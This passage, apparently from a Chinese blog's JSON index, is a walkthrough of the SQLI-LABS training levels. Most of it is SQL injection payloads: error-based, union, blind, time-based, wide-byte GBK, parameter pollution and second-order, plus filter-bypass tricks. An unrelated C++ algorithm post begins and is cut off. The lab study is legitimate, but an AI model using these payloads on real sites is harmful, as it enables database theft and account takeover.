&#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure><br>爆数据<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))&#x3D;121 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure></p>\n<p>但是查看源代码发现这并非本关的闭合方式，闭合的话应该是<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;) and length(database())&#x3D;10%23</span><br></pre></td></tr></table></figure><br>但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。</p>\n<h1 id=\"LESS-63\"><a href=\"#LESS-63\" class=\"headerlink\" title=\"LESS-63\"></a>LESS-63</h1><p>单引号闭合<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-64\"><a href=\"#LESS-64\" class=\"headerlink\" title=\"LESS-64\"></a>LESS-64</h1><p>双括号闭合<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1))%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-65\"><a href=\"#LESS-65\" class=\"headerlink\" title=\"LESS-65\"></a>LESS-65</h1><p>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&quot;)%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。</p>\n","categories":["writeup"],"tags":["SQL注入"]},{"title":"SQLI-LABS(Less11-Less35)","url":"/2018/02/09/sqli-labs2/","content":"<p>接上篇</p>\n<a id=\"more\"></a>\n<h1 id=\"LESS-11\"><a href=\"#LESS-11\" class=\"headerlink\" title=\"LESS-11\"></a>LESS-11</h1><p>有回显，尝试报错注入<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">usernae = admin'and 1=(updatexml(1,concat(0x3a,(<span class=\"keyword\">select</span> <span class=\"keyword\">database</span>())),<span class=\"number\">1</span>))<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">password</span> = <span class=\"keyword\">admin</span><span class=\"string\">'and 1=(updatexml(1,concat(0x3a,(select database())),1))#</span></span><br></pre></td></tr></table></figure></p>\n<p>发现有回显</p>\n<blockquote>\n<p>XPATH syntax error: ‘:security’</p>\n</blockquote>\n<p>则可以得到数据库名。</p>\n<hr>\n<p>常用报错语句</p>\n<p>1、通过floor报错,注入语句如下:<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">and <span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*),<span class=\"keyword\">concat</span>(<span class=\"keyword\">version</span>(),<span class=\"keyword\">floor</span>(<span class=\"keyword\">rand</span>(<span class=\"number\">0</span>)*<span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x)a);</span><br></pre></td></tr></table></figure></p>\n<p>2、通过ExtractValue报错,注入语句如下:<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">and extractvalue(1, concat(0x5c, (<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">limit</span> <span class=\"number\">1</span>)));</span><br></pre></td></tr></table></figure></p>\n<p>3、通过UpdateXml报错,注入语句如下:<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">and 1=(updatexml(1,concat(0x3a,(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())),<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure></p>\n<p>4、通过NAME_CONST报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure></p>\n<p>5、通过join报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure></p>\n<p>6、通过exp报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure></p>\n<p>7、通过GeometryCollection()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure></p>\n<p>8、通过polygon ()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure></p>\n<p>9、通过multipoint ()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure></p>\n<p>10、通过multlinestring ()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure></p>\n<p>11、通过multpolygon ()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure></p>\n<p>12、通过linestring ()报错,注入语句如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>还有其他方法</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1admin' union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">database</span>()<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>这样可以得到数据库名<br>继续爆表</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin45' union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">group_concat</span>(table_name) <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">'security'</span><span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>可以得到</p>\n<blockquote>\n<p>Your Password:emails,referers,uagents,users<br>爆字段</p>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin45' union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">group_concat</span>(column_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'users'</span><span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br>爆内容</p>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin45' union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">concat_ws</span>(<span class=\"keyword\">password</span>) <span class=\"keyword\">from</span> <span class=\"keyword\">users</span><span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"LESS-12\"><a href=\"#LESS-12\" class=\"headerlink\" title=\"LESS-12\"></a>LESS-12</h1><p>构造闭合语句<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin\") or 1=1 limit 0,1<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>\n<p>后面和11关一样</p>\n<h1 id=\"LESS-13\"><a href=\"#LESS-13\" class=\"headerlink\" title=\"LESS-13\"></a>LESS-13</h1><p>尝试 <code>uname=admin&#39;&amp;passwd=1</code>,返回错误信息</p>\n<blockquote>\n<p>near ‘1’) LIMIT 0,1’ at line 1</p>\n</blockquote>\n<p>构造闭合语句<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin')<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><br>可以成功登陆，但是无法和前面一样显示信息，故得使用盲注<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin') and left(database(),1)='s'<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><br>然后一步步可以得到所有信息</p>\n<h1 id=\"LESS-14\"><a href=\"#LESS-14\" class=\"headerlink\" title=\"LESS-14\"></a>LESS-14</h1><p>直接换双引号闭合<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin\" or 1=1<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-15\"><a href=\"#LESS-15\" class=\"headerlink\" title=\"LESS-15\"></a>LESS-15</h1><p>单引号闭合即可<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin\" or 1=1<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>\n<p>也可以延时注入<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))<span class=\"comment\">#&amp;passwd=admin</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-16\"><a href=\"#LESS-16\" class=\"headerlink\" title=\"LESS-16\"></a>LESS-16</h1><p>payload<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin\") or 1=1<span class=\"comment\">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-17\"><a href=\"#LESS-17\" class=\"headerlink\" title=\"LESS-17\"></a>LESS-17</h1><p>本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。<br>报错注入payload<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class=\"keyword\">select</span> @@<span class=\"keyword\">version</span>),<span class=\"number\">0x7e</span>))<span class=\"comment\">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><br>也可以延时注入，但是延时注入会修改数据库内容，不建议使用。</p>\n<p>接下来三关是对header头的注入</p>\n<h1 id=\"LESS-18\"><a href=\"#LESS-18\" class=\"headerlink\" title=\"LESS-18\"></a>LESS-18</h1><p>截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。<br>修改User-Agent，利用报错进行注入<br>payload<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">' and extractvalue(1,concat(0x7e,(<span class=\"keyword\">select</span> <span class=\"keyword\">database</span>()),<span class=\"number\">0x7e</span>)) <span class=\"keyword\">and</span> <span class=\"string\">'1'</span>=<span class=\"string\">'1</span></span><br></pre></td></tr></table></figure></p>\n<p>这个在本题不可以用，但是可以报错，<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">extractvalue(1,concat(0x7e,(<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"keyword\">database</span>() <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>))</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-19\"><a href=\"#LESS-19\" class=\"headerlink\" title=\"LESS-19\"></a>LESS-19</h1><p>只是将注入位置换为referer即可</p>\n<h1 id=\"LESS-20\"><a href=\"#LESS-20\" class=\"headerlink\" title=\"LESS-20\"></a>LESS-20</h1><p>用cookie注入,这里我用的是火狐的Cookie Manager插件<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dumb' and updatexml(1,concat(0x7e,(<span class=\"keyword\">select</span> @@<span class=\"keyword\">version</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure><br>然后可以继续注入获取全部内容。</p>\n<h1 id=\"LESS-21\"><a href=\"#LESS-21\" class=\"headerlink\" title=\"LESS-21\"></a>LESS-21</h1><p>本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dumb') and updatexml(1,concat(0x7e,(<span class=\"keyword\">select</span> @@<span class=\"keyword\">version</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure><br>再用base64编码<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-22\"><a href=\"#LESS-22\" class=\"headerlink\" title=\"LESS-22\"></a>LESS-22</h1><p>与21关相同只是闭合方式变成了双引号<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-23\"><a href=\"#LESS-23\" class=\"headerlink\" title=\"LESS-23\"></a>LESS-23</h1><p>此题过滤了—和#注释符，构造payload闭合 <code>?id=1&#39; and &#39;a&#39;=&#39;a</code>，继续获取文件路径<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;a</span><br></pre></td></tr></table></figure><br>获取表名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;a</span><br></pre></td></tr></table></figure><br>下面的不再演示，还可以报错注入，延时注入等<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure><br>延时注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-24\"><a href=\"#LESS-24\" class=\"headerlink\" title=\"LESS-24\"></a>LESS-24</h1><p>本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。<br>先创建一个用户<code>admin&#39;#</code>，如果修改密码，则会将admin用户的密码修改。SQL语句就变为<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">update</span> <span class=\"keyword\">users</span> <span class=\"keyword\">set</span> paddwd=<span class=\"string\">'new_pass'</span> <span class=\"keyword\">where</span> username=<span class=\"string\">'admin'</span><span class=\"comment\">#' and password='</span></span><br></pre></td></tr></table></figure><br>相当于执行了<code>update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;</code>，从而更改了用户名。</p>\n<h1 id=\"LESS-25\"><a href=\"#LESS-25\" class=\"headerlink\" title=\"LESS-25\"></a>LESS-25</h1><p>单引号闭合联合注入<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1' union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">database</span>(),<span class=\"string\">'a</span></span><br></pre></td></tr></table></figure><br>本题要绕过and和or，有常用的几个方法</p>\n<blockquote>\n<p>(1)大小写变形，如Or,oR,OR<br>(2)编码，hex,urlencode<br>(3)添加注释/*or*/<br>(4)利用符号 and=&amp;&amp; ,or=||<br>(5)重复输入anandd</p>\n</blockquote>\n<p>利用方法4<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1' || updatexml(1,concat(0x7e,(<span class=\"keyword\">select</span> @@<span class=\"keyword\">version</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) || <span class=\"string\">'1'</span>=<span class=\"string\">'1</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-25a\"><a href=\"#LESS-25a\" class=\"headerlink\" title=\"LESS-25a\"></a>LESS-25a</h1><p>本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-26\"><a href=\"#LESS-26\" class=\"headerlink\" title=\"LESS-26\"></a>LESS-26</h1><p>由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1</span><br></pre></td></tr></table></figure></p>\n<p>然后继续注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure></p>\n<p>对于空格常用的方法为：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">编码</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">%09</td>\n<td style=\"text-align:center\">TAB键(水平)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">%0a</td>\n<td style=\"text-align:center\">新建一行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">%0c</td>\n<td style=\"text-align:center\">新的一页</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">%0d</td>\n<td style=\"text-align:center\">return功能</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">%0b</td>\n<td style=\"text-align:center\">TAB键(垂直)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">%a0</td>\n<td style=\"text-align:center\">空格</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h1 id=\"LESS-26a\"><a href=\"#LESS-26a\" class=\"headerlink\" title=\"LESS-26a\"></a>LESS-26a</h1><p>本关无法回显错误，无法使用报错注入，还有闭合方式为 <code>?id=1&#39;)</code><br>盲注payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;anandd(select(substr((select(database())),1,1)))&#x3D;&#39;s</span><br></pre></td></tr></table></figure><br>联合注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;555&#39;)union(select(1),(user()),&#39;1</span><br></pre></td></tr></table></figure><br>爆用户名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;555&#39;)union(select(1),group_concat(username),(2)from(users)where(1&#x3D;1))union(select(1),(2),&#39;a</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-27\"><a href=\"#LESS-27\" class=\"headerlink\" title=\"LESS-27\"></a>LESS-27</h1><p>本题过滤了select和上关的字符，可以大小写混合绕过<br>报错注入payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;0&#39;||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;database())))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-27a\"><a href=\"#LESS-27a\" class=\"headerlink\" title=\"LESS-27a\"></a>LESS-27a</h1><p>本题双引号闭合，无法报错。盲注payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;0&quot;||(SelEct(substr((SelecT(database())),1,1)))&#x3D;&quot;s</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-28\"><a href=\"#LESS-28\" class=\"headerlink\" title=\"LESS-28\"></a>LESS-28</h1><p>与前面没有太大区别，盲注payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;888&#39;)||(SelecT(substr((SelEct(database())),1,1)))&#x3D;(&#39;s</span><br></pre></td></tr></table></figure></p>\n<p>联合注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;888&#39;)unIon(Select(1),database(),&#39;a</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-28a\"><a href=\"#LESS-28a\" class=\"headerlink\" title=\"LESS-28a\"></a>LESS-28a</h1><p>本题知识简单过滤了union等符号，联合注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;555&#39;)unIon(SeLect 1,database(),&#39;3</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-29\"><a href=\"#LESS-29\" class=\"headerlink\" title=\"LESS-29\"></a>LESS-29</h1><p>注意：本题的index.php页面没有任何防护，注册页面是在login.php页面</p>\n<p>在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&amp;id&#x3D;-1&#39; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></figure><br>本关为HPP(http参数污染)攻击,具体参见百度</p>\n<h1 id=\"LESS-30\"><a href=\"#LESS-30\" class=\"headerlink\" title=\"LESS-30\"></a>LESS-30</h1><p>与29关相同，只是闭合方式改为<code>&quot;</code><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&amp;id&#x3D;-1&quot; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-31\"><a href=\"#LESS-31\" class=\"headerlink\" title=\"LESS-31\"></a>LESS-31</h1><p>与前面的相同，只是闭合方式变了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,database(),3--+</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h1 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h1><p>原理：</p>\n<blockquote>\n<p>mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤<code>&#39;</code>的时候，往往利用的思路是将<strong><code>\\&#39;</code></strong>，因此我们的思路就是将’前面的\\换掉。</p>\n</blockquote>\n<p>方法一般有两种：</p>\n<blockquote>\n<p>1、%df吃掉\\\\，具体的原因是urlencode(\\\\’)=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。<br>2、将<code>%\\*\\*%5c%5c%27</code>的情况，后面%5c会被前面的%5c给注释掉</p>\n</blockquote>\n<hr>\n<h1 id=\"LESS-32\"><a href=\"#LESS-32\" class=\"headerlink\" title=\"LESS-32\"></a>LESS-32</h1><p>用第一种方法绕过<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1%df%27union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure><br>这个payload执行的sql语句是<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 1,2,3 from users where id&#x3D;&#39;-1運&#39;union select 1,user(),3;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-33\"><a href=\"#LESS-33\" class=\"headerlink\" title=\"LESS-33\"></a>LESS-33</h1><p>这个和上一题没什么区别，同样的payload也可以用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1%df%27union select 1,2,@@basedir--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-34\"><a href=\"#LESS-34\" class=\"headerlink\" title=\"LESS-34\"></a>LESS-34</h1><p>本关是post型的注入漏洞，同样也是进行了<code>♦&#39;</code>，我们利用这个方式尝试。payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname&#x3D;♦&#39; or 1&#x3D;1#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure></p>\n<p>继续的话可以<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname&#x3D;♦&#39; union select 2,@@basedir#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-35\"><a href=\"#LESS-35\" class=\"headerlink\" title=\"LESS-35\"></a>LESS-35</h1><p>本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></figure><br>在后面的时候有个数字型注入，编码绕过即可<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure></p>\n","categories":["writeup"],"tags":["SQL注入"]},{"title":"简单算法记录","url":"/2019/01/01/suanfa/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下</p>\n<a id=\"more\"></a>\n<h1 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h1><h2 id=\"最长公共子序列\"><a href=\"#最长公共子序列\" class=\"headerlink\" title=\"最长公共子序列\"></a>最长公共子序列</h2><blockquote>\n<p>题目描述<br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=<a,b,f,c>是序列X=<a,b,c,f,b,c>的一个子序列，Z中的元素在X中的下标序列为<1,2,4,6>。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</1,2,4,6></a,b,c,f,b,c></a,b,f,c></p>\n<p>输入<br>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p>\n<p>输出<br>对于每组输入，输出两个字符串的最长公共子序列的长度。</p>\n</blockquote>\n<p>最长公共子序列问题，递推公式为</p>\n<p><img src=\"/2019/01/01/suanfa/1.png\" alt></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> x;</span><br><span class=\"line\"><span class=\"built_in\">string</span> y;</span><br><span class=\"line\"><span class=\"keyword\">int</span> b[<span class=\"number\">105</span>][<span class=\"number\">105</span>],c[<span class=\"number\">105</span>][<span class=\"number\">105</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">LCSLength</span><span class=\"params\">(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=m;i++) c[i][<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=n;i++) c[<span class=\"number\">0</span>][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;m;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;n;j++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(x[i]==y[j])&#123;</span><br><span class=\"line\">\t\t\t\tc[i][j] = c[i<span class=\"number\">-1</span>][j<span class=\"number\">-1</span>] + <span 